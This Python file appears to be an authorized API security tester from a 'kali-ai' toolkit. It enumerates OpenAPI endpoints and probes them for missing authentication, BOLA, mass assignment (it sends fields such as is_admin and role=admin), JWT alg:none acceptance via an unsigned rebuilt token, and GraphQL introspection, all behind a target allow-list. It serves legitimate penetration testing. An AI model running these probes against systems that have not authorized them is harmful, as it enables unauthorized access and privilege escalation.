#!/usr/bin/env python3
"""
API-first security tester for kali-ai.

Ingests an OpenAPI v2/v3 (Swagger) JSON spec, enumerates endpoints, and tests
each for BOLA, mass-assignment, missing-authentication, and JWT alg:none
acceptance. Also runs GraphQL introspection checks. All requests target
AUTHORIZED hosts only; write tests are gated behind --include-writes.

STDLIB ONLY. Evidence is written under /work/loot/<target>/api/ and referenced
by path. Network/parse errors return structured JSON, never a stack trace.

Usage: python3 /tools/api_tester.py <command> [args]

Commands:
  ingest <spec_url_or_file>
  test <target> <spec> [<session_file>] [--include-writes]
  graphql <target> <endpoint>
"""

import base64
import fnmatch
import ipaddress
import json
import re
import sys
import time
import urllib.error
import urllib.request
import uuid
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlsplit

CONFIG_FILE = Path("/config/authorized-targets.json")
LOOT_ROOT = Path("/work/loot")
RATE = 0.3
PRIV_FIELDS = ["is_admin", "isAdmin", "role", "verified", "balance",
               "is_superuser", "admin", "permissions"]
ID_HINT = re.compile(r"(?:^|_)(id|uuid|pk|user_?id|account_?id|order_?id)$", re.I)

# Authorization rail (shared convention)


def _extract_host(target: str) -> str:
    t = target.lower().strip()
    if "://" in t:
        t = t.split("://", 1)[1]
    t = t.split("/", 1)[0]
    if not t.startswith("[") and t.count(":") == 1:
        t = t.split(":", 1)[0]
    return t


def _safe_name(target: str) -> str:
    host = _extract_host(target)
    return re.sub(r"[^A-Za-z0-9_.-]+", "_", host).strip("_") or "target"


def _load_config() -> Dict[str, Any]:
    if not CONFIG_FILE.exists():
        return {"targets": [], "lab_mode": False}
    try:
        return json.loads(CONFIG_FILE.read_text())
    except Exception:
        return {"targets": [], "lab_mode": False}


def _match_domain(host: str, pattern: str) -> bool:
    host, pattern = host.lower().strip(), pattern.lower().strip()
    if not pattern:
        return False
    if host == pattern or fnmatch.fnmatch(host, pattern):
        return True
    return host.endswith("." + pattern)


def authorized(target: str) -> bool:
    """Return True if `target` is authorized in /config/authorized-targets.json."""
    config = _load_config()
    host = _extract_host(target)
    if config.get("lab_mode", False):
        if host in ("localhost", "127.0.0.1", "::1"):
            return True
        try:
            if ipaddress.ip_address(host).is_loopback:
                return True
        except ValueError:
            pass
    for t in config.get("targets", []):
        if _match_domain(host, t.get("domain", "")):
            return True
    return False


def ensure_authorized(target: str) -> None:
    if not authorized(target):
        print(json.dumps({"error": "target not authorized", "target": target}))
        sys.exit(2)


# Findings contract


def append_finding(target: str, finding: Dict[str, Any]) -> Dict[str, Any]:
    """Append one finding (JSON per line) to /work/loot/<target>/findings.jsonl."""
    out = dict(finding)
    out.setdefault("id", "F-" + uuid.uuid4().hex[:10])
    out.setdefault("title", "Untitled finding")
    out.setdefault("type", "other")
    out.setdefault("severity", "info")
    out.setdefault("detail", "")
    out.setdefault("evidence", [])
    findings_file = LOOT_ROOT / _safe_name(target) / "findings.jsonl"
    findings_file.parent.mkdir(parents=True, exist_ok=True)
    with findings_file.open("a") as f:
        f.write(json.dumps(out) + "\n")
    return out


def _api_dir(target: str) -> Path:
    d = LOOT_ROOT / _safe_name(target) / "api"
    d.mkdir(parents=True, exist_ok=True)
    return d


# HTTP helper


def _request(method: str, url: str, headers: Optional[Dict[str, str]] = None,
             body: Optional[str] = None, timeout: int = 15) -> Dict[str, Any]:
    data = body.encode("utf-8") if isinstance(body, str) else body
    req = urllib.request.Request(url, data=data, method=method.upper())
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    req.add_header("User-Agent", "kali-ai-api/1.0")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:  # noqa: S310 authorized
            raw = resp.read(1_000_000).decode("utf-8", "replace")
            return {"status": resp.status, "body": raw, "error": None}
    except urllib.error.HTTPError as exc:
        try:
            raw = exc.read(1_000_000).decode("utf-8", "replace")
        except Exception:
            raw = ""
        return {"status": exc.code, "body": raw, "error": None}
    except Exception as exc:  # noqa: BLE001
        return {"status": None, "body": "", "error": str(exc)}


# Spec loading & enumeration


def _load_spec(spec: str) -> Dict[str, Any]:
    """Load an OpenAPI spec from a URL or file. Returns {} plus 'error' on failure."""
    text = ""
    if spec.startswith("http://") or spec.startswith("https://"):
        resp = _request("GET", spec)
        if resp.get("error") or not resp.get("body"):
            return {"error": f"could not fetch spec: {resp.get('error')}"}
        text = resp["body"]
    else:
        p = Path(spec)
        if not p.exists():
            return {"error": f"spec file not found: {spec}"}
        try:
            text = p.read_text()
        except Exception as exc:
            return {"error": f"could not read spec: {exc}"}
    try:
        return json.loads(text)
    except Exception:
        stripped = text.lstrip()
        if not stripped.startswith("{"):
            return {"error": "yaml unsupported, provide JSON"}
        return {"error": "spec is not valid JSON"}


def _spec_base_url(doc: Dict[str, Any]) -> str:
    """Derive a base URL from an OpenAPI v2 or v3 spec."""
    servers = doc.get("servers")
    if isinstance(servers, list) and servers:
        url = servers[0].get("url", "")
        if url.startswith("http"):
            return url.rstrip("/")
    # OpenAPI v2
    host = doc.get("host")
    if host:
        scheme = (doc.get("schemes") or ["https"])[0]
        base = doc.get("basePath", "")
        return f"{scheme}://{host}{base}".rstrip("/")
    return ""


def _requires_auth(operation: Dict[str, Any], doc: Dict[str, Any]) -> bool:
    if "security" in operation:
        return bool(operation.get("security"))
    return bool(doc.get("security"))


def enumerate_endpoints(doc: Dict[str, Any]) -> List[Dict[str, Any]]:
    """Enumerate {method, path, params, auth_required} from an OpenAPI spec."""
    endpoints: List[Dict[str, Any]] = []
    for path, item in (doc.get("paths") or {}).items():
        if not isinstance(item, dict):
            continue
        common = item.get("parameters", [])
        for method, op in item.items():
            if method.lower() not in ("get", "post", "put", "patch", "delete", "head"):
                continue
            if not isinstance(op, dict):
                continue
            params = []
            for p in list(common) + list(op.get("parameters", [])):
                if isinstance(p, dict):
                    params.append({"name": p.get("name"), "in": p.get("in"),
                                   "type": p.get("type") or (p.get("schema") or {}).get("type")})
            endpoints.append({
                "method": method.upper(),
                "path": path,
                "params": params,
                "auth_required": _requires_auth(op, doc),
            })
    return endpoints


def ingest(spec: str) -> Dict[str, Any]:
    """Load a spec, derive its target host, and write endpoints.json."""
    doc = _load_spec(spec)
    if doc.get("error"):
        return doc
    base_url = _spec_base_url(doc)
    target = _extract_host(base_url) if base_url else "unknown-api"
    endpoints = enumerate_endpoints(doc)
    adir = _api_dir(target)
    out = adir / "endpoints.json"
    out.write_text(json.dumps({"target": target, "base_url": base_url,
                               "count": len(endpoints), "endpoints": endpoints}, indent=2))
    return {"target": target, "base_url": base_url,
            "endpoint_count": len(endpoints), "endpoints_file": str(out)}


# JWT alg:none test (no signature forgery against real keys)


def _b64url_decode(seg: str) -> bytes:
    seg += "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _make_alg_none_token(jwt: str) -> Optional[str]:
    """Rebuild a JWT with alg=none and an empty signature. No key forgery."""
    parts = jwt.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None
    header["alg"] = "none"
    new_h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    new_p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{new_h}.{new_p}."


def _extract_bearer_jwt(headers: Dict[str, str]) -> Optional[str]:
    auth = headers.get("Authorization") or headers.get("authorization") or ""
    m = re.match(r"[Bb]earer\s+([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*)", auth)
    return m.group(1) if m else None


# test command


def _fill_path(base_url: str, path: str, value: str = "1") -> Tuple[str, List[str]]:
    """Replace {param} placeholders with `value`; return url + replaced params."""
    replaced = re.findall(r"\{([^}]+)\}", path)
    filled = re.sub(r"\{[^}]+\}", value, path)
    return base_url + filled, replaced


def test(target: str, spec: str, session_file: Optional[str] = None,
         include_writes: bool = False) -> Dict[str, Any]:
    """Run BOLA / mass-assignment / missing-auth / JWT tests across the spec."""
    ensure_authorized(target)
    doc = _load_spec(spec)
    if doc.get("error"):
        return doc
    base_url = _spec_base_url(doc) or f"https://{_extract_host(target)}"
    if not authorized(base_url):
        base_url = f"https://{_extract_host(target)}"
    adir = _api_dir(target)
    session_headers: Dict[str, str] = {}
    if session_file:
        try:
            session_headers = json.loads(Path(session_file).read_text()).get("headers", {})
        except Exception as exc:
            return {"error": f"could not load session file: {exc}"}

    endpoints = enumerate_endpoints(doc)
    summary = {"target": target, "base_url": base_url, "tested": 0,
               "bola": 0, "mass_assignment": 0, "missing_auth": 0, "jwt": 0,
               "api_dir": str(adir)}
    log: List[Dict[str, Any]] = []

    for ep in endpoints:
        method, path = ep["method"], ep["path"]
        has_id = "{" in path
        url, replaced = _fill_path(base_url, path, "1")
        if not authorized(url):
            continue

        # (c) missing-auth: call auth-required endpoints WITHOUT the session
        if ep["auth_required"] and method in ("GET", "HEAD"):
            r = _request(method, url, headers={})
            time.sleep(RATE)
            if isinstance(r["status"], int) and 200 <= r["status"] < 300:
                ev = adir / f"missing_auth_{summary['tested']}.json"
                ev.write_text(json.dumps({"url": url, "method": method, **r}, indent=2))
                append_finding(target, {
                    "title": f"Missing authentication: {method} {path}",
                    "type": "auth-bypass", "severity": "high",
                    "detail": f"Auth-required endpoint returned HTTP {r['status']} "
                              "with no session/credentials.",
                    "evidence": [str(ev)],
                })
                summary["missing_auth"] += 1

        # (a) BOLA: shift ID-looking path params and compare with session
        if has_id and method in ("GET", "HEAD"):
            base = _request(method, url, headers=session_headers)
            time.sleep(RATE)
            for alt_val in ("2", "9999999"):
                alt_url, _ = _fill_path(base_url, path, alt_val)
                if not authorized(alt_url):
                    continue
                alt = _request(method, alt_url, headers=session_headers)
                time.sleep(RATE)
                if (isinstance(alt["status"], int) and 200 <= alt["status"] < 300
                        and alt.get("body") and alt["body"] != base.get("body")):
                    ev = adir / f"bola_{summary['tested']}_{alt_val}.json"
                    ev.write_text(json.dumps({"base_url": url, "alt_url": alt_url,
                                              "base_status": base["status"],
                                              "alt_status": alt["status"]}, indent=2))
                    append_finding(target, {
                        "title": f"BOLA on {method} {path}",
                        "type": "bola", "severity": "high",
                        "detail": f"Object id swap to '{alt_val}' returned HTTP "
                                  f"{alt['status']} with distinct object data.",
                        "evidence": [str(ev)],
                    })
                    summary["bola"] += 1
                    break

        # (b) mass-assignment: POST/PUT with guessed privileged fields
        if method in ("POST", "PUT", "PATCH") and include_writes:
            payload = {f: (True if f not in ("role", "balance", "permissions") else "admin")
                       for f in PRIV_FIELDS}
            hdrs = dict(session_headers)
            hdrs["Content-Type"] = "application/json"
            r = _request(method, url, headers=hdrs, body=json.dumps(payload))
            time.sleep(RATE)
            reflected = [f for f in PRIV_FIELDS if f in (r.get("body") or "")]
            if isinstance(r["status"], int) and 200 <= r["status"] < 300 and reflected:
                ev = adir / f"massassign_{summary['tested']}.json"
                ev.write_text(json.dumps({"url": url, "sent": payload,
                                          "status": r["status"],
                                          "reflected": reflected}, indent=2))
                append_finding(target, {
                    "title": f"Mass assignment on {method} {path}",
                    "type": "mass-assignment", "severity": "high",
                    "detail": f"Privileged fields {reflected} accepted/reflected "
                              f"(HTTP {r['status']}).",
                    "evidence": [str(ev)],
                })
                summary["mass_assignment"] += 1

        summary["tested"] += 1
        log.append({"method": method, "path": path, "auth": ep["auth_required"]})

    # (d) JWT alg:none — one representative auth-required GET endpoint
    jwt = _extract_bearer_jwt(session_headers)
    if jwt:
        forged = _make_alg_none_token(jwt)
        gets = [e for e in endpoints if e["auth_required"] and e["method"] == "GET"]
        if forged and gets:
            url, _ = _fill_path(base_url, gets[0]["path"], "1")
            if authorized(url):
                hdrs = {k: v for k, v in session_headers.items()
                        if k.lower() != "authorization"}
                hdrs["Authorization"] = f"Bearer {forged}"
                r = _request("GET", url, headers=hdrs)
                time.sleep(RATE)
                if isinstance(r["status"], int) and 200 <= r["status"] < 300:
                    ev = adir / "jwt_alg_none.json"
                    ev.write_text(json.dumps({"url": url, "status": r["status"],
                                              "note": "alg:none token accepted"}, indent=2))
                    append_finding(target, {
                        "title": "JWT alg:none accepted",
                        "type": "jwt", "severity": "critical",
                        "detail": "Server accepted an unsigned JWT with alg=none "
                                  f"(HTTP {r['status']}). Signature verification bypass.",
                        "evidence": [str(ev)],
                    })
                    summary["jwt"] += 1

    (adir / "test-log.json").write_text(json.dumps(log, indent=2))
    return summary


# graphql command

_INTROSPECTION = {
    "query": "query IntrospectionQuery { __schema { queryType { name } "
             "types { name kind fields { name } } } }"
}


def graphql(target: str, endpoint: str) -> Dict[str, Any]:
    """Send an introspection query; flag + dump schema if introspection is on."""
    ensure_authorized(target)
    if not authorized(endpoint):
        print(json.dumps({"error": "target not authorized", "target": endpoint}))
        sys.exit(2)
    adir = _api_dir(target)
    r = _request("POST", endpoint,
                 headers={"Content-Type": "application/json"},
                 body=json.dumps(_INTROSPECTION))
    if r.get("error"):
        return {"target": target, "endpoint": endpoint, "error": r["error"]}
    introspection_enabled = False
    try:
        parsed = json.loads(r["body"])
        introspection_enabled = bool(parsed.get("data", {}).get("__schema"))
    except Exception:
        parsed = None
    if introspection_enabled:
        schema_file = adir / "graphql-schema.json"
        schema_file.write_text(json.dumps(parsed, indent=2))
        append_finding(target, {
            "title": "GraphQL introspection enabled",
            "type": "info disclosure", "severity": "low",
            "detail": f"Introspection query at {endpoint} returned the full schema.",
            "evidence": [str(schema_file)],
        })
        return {"target": target, "endpoint": endpoint,
                "introspection_enabled": True, "schema_file": str(schema_file)}
    return {"target": target, "endpoint": endpoint,
            "introspection_enabled": False, "status": r["status"]}


# CLI


def main() -> None:
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    cmd = sys.argv[1]
    args = sys.argv[2:]

    if cmd == "ingest":
        if not args:
            print(json.dumps({"error": "usage: ingest <spec_url_or_file>"}))
            sys.exit(1)
        print(json.dumps(ingest(args[0]), indent=2))
    elif cmd == "test":
        if len(args) < 2:
            print(json.dumps({"error": "usage: test <target> <spec> "
                                       "[<session_file>] [--include-writes]"}))
            sys.exit(1)
        include_writes = "--include-writes" in args
        positional = [a for a in args if not a.startswith("--")]
        session_file = positional[2] if len(positional) > 2 else None
        print(json.dumps(test(positional[0], positional[1], session_file,
                              include_writes), indent=2))
    elif cmd == "graphql":
        if len(args) < 2:
            print(json.dumps({"error": "usage: graphql <target> <endpoint>"}))
            sys.exit(1)
        print(json.dumps(graphql(args[0], args[1]), indent=2))
    else:
        print(json.dumps({"error": f"unknown command: {cmd}"}))
        print(__doc__)
        sys.exit(1)


if __name__ == "__main__":
    main()
